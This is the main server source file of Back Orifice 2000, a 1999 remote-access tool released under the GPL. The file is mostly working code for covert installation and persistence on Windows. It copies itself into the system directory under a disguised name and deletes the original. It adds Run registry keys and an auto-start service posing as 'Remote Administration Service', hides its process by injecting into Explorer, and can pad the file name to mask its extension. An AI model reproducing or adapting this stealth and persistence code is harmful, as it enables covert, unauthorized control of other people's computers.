/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// ************************************************
//         BO2K                         cDc 
//                 Back Orifice 2000
//         Written By DilDog and Sir Dystic
//    Copyright (C) 1999,  Cult of the Dead Cow
//  Special thanks to L0pht Heavy Industries, Inc.
// ************************************************

#include<windows.h>
#include<main.h>
#include<bo_debug.h>
#include<functions.h>
#include<plugins.h>
#include<osversion.h>
#include<bocomreg.h>
#include<comm_native.h>
#include<commandloop.h>
#include<dll_load.h>
#include<config.h>
#include<pviewer.h>
#include<process_hop.h>

#ifdef NDEBUG
#define HOOK_PROCESS
//#define HIDE_COPY
#endif

HMODULE g_module=NULL;
HANDLE g_hfm=NULL;
DWORD g_dwThreadID=0;

BOOL g_bRestart=FALSE;
char g_svRestartProcess[64];
BOOL g_bEradicate=FALSE;

// --------------- Stealth options ----------------
char g_svStealthOptions[]="<**CFG**>Stealth\0"
#ifdef HIDE_COPY
						  "B:Run at startup=1\0"
						  "B:Delete original file=1\0"
						  "B:Insidious mode=0\0"
#else
						  "B:Run at startup=0\0"
						  "B:Delete original file=0\0"
						  "B:Insidious mode=0\0"
#endif
                          "S[64]:Runtime pathname=UMGR32.EXE\0.....................................................\0"
#ifdef HOOK_PROCESS						  
						  "B:Hide process=1\0"
#else
						  "B:Hide process=0\0"
#endif
						  "S[48]:Host process name (NT)=EXPLORER\0.......................................\0"
						  "S[48]:Service Name (NT)=Remote Administration Service\0..................\0";


void EradicateBO2K(void)
{	
	char *svRunRegKey;
	char *svTarget=GetCfgStr(g_svStealthOptions,"Runtime pathname");
	
	// Eradicate from run key
	if(g_bIsWinNT) {
		svRunRegKey="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	} else {
		svRunRegKey="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
	}
	HKEY key;
	
	RegOpenKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key);
	RegDeleteValue(key,svTarget);
	RegCloseKey(key);
	
	if(g_bIsWinNT) {
		// Eradicate from user reg key
		RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key);
		RegDeleteValue(key,svTarget);
		RegCloseKey(key);
		
		// Eradicate from service database
		SC_HANDLE scm=pOpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
		if(scm!=NULL) {
			SC_HANDLE srv=pOpenService(scm,GetCfgStr(g_svStealthOptions,"Service Name (NT)"),SERVICE_STOP|DELETE);
			if(srv!=NULL) {
				pDeleteService(srv);
				pCloseServiceHandle(srv);
			}
			pCloseServiceHandle(scm);
		}
	}

}


// Back Orifice Thread Entry Point 
DWORD WINAPI EntryPoint(LPVOID lpParameter)
{	
startofentrypoint:;
	g_bRestart=FALSE;

	g_module=(HMODULE)lpParameter;

	// Load up other DLLs just to make sure we have them (we're acting as a loader here).

	LoadLibrary("kernel32.dll");
	LoadLibrary("user32.dll");
	LoadLibrary("gdi32.dll");
	LoadLibrary("winspool.dll");
	LoadLibrary("advapi32.dll");
	LoadLibrary("shell32.dll");
	LoadLibrary("ole32.dll");
	LoadLibrary("oleaut32.dll");
	LoadLibrary("wsock32.dll");

	// Create useless window class
	WNDCLASS wndclass;
	wndclass.style = 0;
	wndclass.lpfnWndProc = DefWindowProc;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hInstance = g_module;
	wndclass.hIcon = NULL;
	wndclass.hCursor = NULL;
	wndclass.hbrBackground = NULL;
	wndclass.lpszMenuName = NULL;
	wndclass.lpszClassName = "WSCLAS";
	
	RegisterClass(&wndclass);

	// Determine OS version	
	GetOSVersion();

	// Use Dynamic Libraries
	InitDynamicLibraries();

	// Enable permissions on Windows NT
	if(g_bIsWinNT) {
		HANDLE tok;
		if(pOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&tok)) {
			LUID luid;
			TOKEN_PRIVILEGES tp;
			pLookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&luid);
			tp.PrivilegeCount=1;
			tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
			tp.Privileges[0].Luid=luid;
			pAdjustTokenPrivileges(tok,FALSE,&tp,NULL,NULL,NULL);
		
			pLookupPrivilegeValue(NULL,SE_SECURITY_NAME,&luid);
			tp.PrivilegeCount=1;
			tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
			tp.Privileges[0].Luid=luid;
			pAdjustTokenPrivileges(tok,FALSE,&tp,NULL,NULL,NULL);
			CloseHandle(tok);
		}
	}


	// Start up Command Dispatcher
	InitializeCommandDispatcher();

	// Initialize commands
	InitializeCommands();

	// Do Primary Command Loop
	CommandHandlerLoop();
		
	// Kill plugins
	TerminateCommands();

	// Kill Command Dispatcher
	KillCommandDispatcher();

	// Completely remove BO2K upon request
	if(g_bEradicate) {
		EradicateBO2K();
	}

	// Kill Dynamic Libraries
	KillDynamicLibraries();

	// Restart BO2K if desired	
	if(g_bRestart) {
		if(g_svRestartProcess[0]=='\0') goto startofentrypoint;

		if(GetCfgBool(g_svStealthOptions,"Hide process") && g_bIsWinNT) {
			if(!SpawnBO2KThread(g_svRestartProcess)) 
				goto startofentrypoint;
		} else goto startofentrypoint;
	}

	return 0;
}


// WinMain: Program Entry Point
extern "C" int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow);

VOID WINAPI Handler( DWORD fdwControl ) 
{
	
}

void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpszArgv)
{
	SERVICE_STATUS_HANDLE ssh=pRegisterServiceCtrlHandler(GetCfgStr(g_svStealthOptions,"Service Name (NT)"), &Handler);

	SERVICE_STATUS ss;
	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS;
	ss.dwCurrentState=SERVICE_RUNNING;
	ss.dwControlsAccepted=0;
	ss.dwWin32ExitCode=NO_ERROR;
	ss.dwCheckPoint=0;
	ss.dwWaitHint=0;
	pSetServiceStatus(ssh,&ss);

	EntryPoint(GetModuleHandle(NULL));

	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS;
	ss.dwCurrentState=SERVICE_STOPPED;
	ss.dwControlsAccepted=0;
	ss.dwWin32ExitCode=NO_ERROR;
	ss.dwCheckPoint=0;
	ss.dwWaitHint=0;
	pSetServiceStatus(ssh,&ss);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{	
	g_module=GetModuleHandle(NULL);
	GetOSVersion();
	InitDynamicLibraries();
	
	// Get stealth options
	BOOL bHideProcess=GetCfgBool(g_svStealthOptions,"Hide process");
	BOOL bRunAtStartup=GetCfgBool(g_svStealthOptions,"Run at startup");

	// Check for file to delete
	char *svCmdLine=GetCommandLine();
	while(svCmdLine[0]!='\0') {
		svCmdLine++;
		if((*(svCmdLine-1))==' ') break;
	}
			
	if(svCmdLine[0]!='\0') {
		if(GetCfgBool(g_svStealthOptions,"Delete original file")) {
			while(DeleteFile(svCmdLine)==0) {
				if(GetLastError()==ERROR_FILE_NOT_FOUND) break;
				Sleep(100);
			}
		}
	}

	// Determine how things should run at startup
	if(bRunAtStartup) {
		// Install levels:
		// 0: Not installed
		// 1: Installed, not run from anywhere
		// 2: Installed, run from user registry key
		// 3: Installed, run from system-wide registry key
		// 4: Installed, run as service
		int nInstall=0;

		char *svRunRegKey;
		if(g_bIsWinNT) {
			svRunRegKey="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		} else {
			svRunRegKey="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
		}
		
		// Get current module location
		char svFileName[512];
		GetModuleFileName(g_module,svFileName,512);
		//MessageBox(NULL,svFileName,"File Name",MB_OK);

		// Get target installation pathname
		char svName[MAX_PATH];
		char svTargetName[MAX_PATH],*svFilePart;
		char *svTarget=GetCfgStr(g_svStealthOptions,"Runtime pathname");
		GetSystemDirectory(svName,MAX_PATH-1);
		lstrcat(svName,"\\");
		lstrcpyn(svName+lstrlen(svName),svTarget,MAX_PATH-lstrlen(svName));
		GetFullPathName(svName,MAX_PATH,svTargetName,&svFilePart);
		
		// Add insidious extension
		if(GetCfgBool(g_svStealthOptions,"Insidious mode")) {
			memset(svTargetName+lstrlen(svTargetName),' ',MAX_PATH-lstrlen(svTargetName));
			svTargetName[MAX_PATH-2]='e';
			svTargetName[MAX_PATH-1]='\0';
		}

		// ------------- Determine current install level -----------------

		// ----- 1: Check for installation -----

		if(GetFileAttributes(svTargetName)!=0xFFFFFFFF) {
			nInstall=1;
		}

		// ----- 2: Check user registry key (NT only)
		if(nInstall==1 && g_bIsWinNT) {
			HKEY key;
			if(RegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key)==ERROR_SUCCESS) {
				DWORD len=512;
				char svRegPath[512];
				if(RegQueryValueEx(key,svFilePart,NULL,NULL,(BYTE *)svRegPath,&len)==ERROR_SUCCESS) {
					if(lstrcmpi(svRegPath,svTargetName)==0) {
						nInstall=2;
					}
				}
			}
		}
		// ----- 3: Check system-wide registry key
		if(nInstall==1) {
			HKEY key;
			if(RegCreateKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key)==ERROR_SUCCESS) {
				DWORD len=512;
				char svRegPath[512];
				if(RegQueryValueEx(key,svFilePart,NULL,NULL,(BYTE *)svRegPath,&len)==ERROR_SUCCESS) {
					if(lstrcmpi(svRegPath,svTargetName)==0) {
						nInstall=3;
					}
				}
			}
		}
		
		// ----- 4: Check service database (NT only)
		if(nInstall==1 && g_bIsWinNT) {
			SC_HANDLE scm=pOpenSCManager(NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE);
			if(scm!=NULL) {
				char svBuf[512];
				DWORD len;
				if(pGetServiceDisplayName(scm,GetCfgStr(g_svStealthOptions,"Service Name (NT)"),svBuf,&len)!=0) {
					nInstall=4;
				}
				pCloseServiceHandle(scm);
			}
		}

		// ------------- See if we can raise our install level ----------------
		int nOldInstall=nInstall;

		if(nInstall==0 || (lstrcmpi(svFileName,svTargetName)!=0)) {
			// Make copy of file
			while(CopyFile(svFileName,svTargetName,FALSE)==0) Sleep(1000);

			// And now run the copy, si
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			char svComLine[2048];
			lstrcpyn(svComLine,svTargetName,2048);
			lstrcpyn(svComLine+lstrlen(svComLine)," ",2048-lstrlen(svComLine));
			lstrcpyn(svComLine+lstrlen(svComLine),svFileName,2048-lstrlen(svComLine));
			memset(&si,0,sizeof(STARTUPINFO));
			si.cb=sizeof(STARTUPINFO);
			si.dwFlags=STARTF_FORCEOFFFEEDBACK;
			
			//MessageBox(NULL,svComLine,"Command Line before...",MB_OK);
			CreateProcess(NULL,svComLine,NULL,NULL,0,0,NULL,NULL,&si,&pi);
			
			KillDynamicLibraries();
			return 0;
		}

		if((nInstall>0) && (nInstall<4) && g_bIsWinNT) {
			SC_HANDLE scm=pOpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
			if(scm!=NULL) {
				char svBinary[1024];
				wsprintf(svBinary,"\"%s\"",svTargetName);
				
				SC_HANDLE svc=pCreateService(scm,
					GetCfgStr(g_svStealthOptions,"Service Name (NT)"),
					GetCfgStr(g_svStealthOptions,"Service Name (NT)"),
					0,
					SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
					SERVICE_AUTO_START,
					SERVICE_ERROR_IGNORE,
					svBinary,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);
	
				if(svc!=NULL) {
					nInstall=4;
					pCloseServiceHandle(svc);
				}
				pCloseServiceHandle(scm);
			}
		}

		if((nInstall>0) && (nInstall<3)) {
			HKEY key;
			if(RegOpenKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key)==ERROR_SUCCESS) {
				if(RegSetValueEx(key,svTarget,0,REG_SZ,(BYTE *)svTargetName,lstrlen(svTargetName))==ERROR_SUCCESS) {
					nInstall=3;
				}
				RegCloseKey(key);
			}
		}
		
		if((nInstall>0) && (nInstall<2) && g_bIsWinNT) {
			HKEY key;
			if(RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key)==ERROR_SUCCESS) {
				if(RegSetValueEx(key,svTarget,0,REG_SZ,(BYTE *)svTargetName,lstrlen(svTargetName))==ERROR_SUCCESS) {
					nInstall=2;
				}
				RegCloseKey(key);
			}
		}

		// ------------------- Clean up OLD install level ---------------------

		if(nInstall!=nOldInstall) {
			if(nOldInstall==2) {
				HKEY key;
				if(RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key)==ERROR_SUCCESS) {
					RegDeleteValue(key,svFilePart);
					RegCloseKey(key);
				}
			}
			if(nOldInstall==3) {
				HKEY key;
				if(RegOpenKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key)==ERROR_SUCCESS) {
					RegDeleteValue(key,svFilePart);
					RegCloseKey(key);
				}
			}
		}

		// Start BO2K Thread
		if(g_bIsWinNT && nInstall==4) {
			char svUserName[256];
			DWORD dwBufSize=256;
			GetUserName(svUserName,&dwBufSize);
			//MessageBox(NULL,svUserName,"UserName",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
			if(lstrcmpi(svUserName,"SYSTEM")==0) {
				SERVICE_TABLE_ENTRY ste[2];
				ste[0].lpServiceName=GetCfgStr(g_svStealthOptions,"Service Name (NT)");
				ste[0].lpServiceProc=ServiceMain;
				ste[1].lpServiceName=NULL;
				ste[1].lpServiceProc=NULL;
				if(pStartServiceCtrlDispatcher(ste)>0) {
					KillDynamicLibraries();
					return 0;	
				}
			} else {
				SC_HANDLE scm=pOpenSCManager(NULL,NULL,SC_MANAGER_CONNECT);
				if(scm!=NULL) {
					SC_HANDLE svc=pOpenService(scm,GetCfgStr(g_svStealthOptions,"Service Name (NT)"),SERVICE_START);
					if(svc!=NULL) {
						if(pStartService(svc,0,NULL)>0){
							pCloseServiceHandle(svc);
							pCloseServiceHandle(scm);
							KillDynamicLibraries();
							return 0;
						} else {
							if(GetLastError()==ERROR_SERVICE_ALREADY_RUNNING) {
								pCloseServiceHandle(svc);
								pCloseServiceHandle(scm);
								KillDynamicLibraries();
								return 0;
							}
						}
						pCloseServiceHandle(svc);
					}
					pCloseServiceHandle(scm);
				}
			}
		}
	}
			
	if(g_bIsWinNT) {
		char svUserName[256];
		DWORD dwBufSize=256;
		GetUserName(svUserName,&dwBufSize);
		if(lstrcmpi(svUserName,"LocalSystem")==0) {
			EntryPoint(GetModuleHandle(NULL));
			KillDynamicLibraries();
			return 0;
		}
	}
	
	if(bHideProcess) {
		// Hide process
		char *svProcess=GetCfgStr(g_svStealthOptions,"Host process name");
		SpawnBO2KThread(svProcess);
	} else {
		// ---------- Not process hiding ---------------
		EntryPoint(GetModuleHandle(NULL));
	}

	KillDynamicLibraries();
	return 0;
}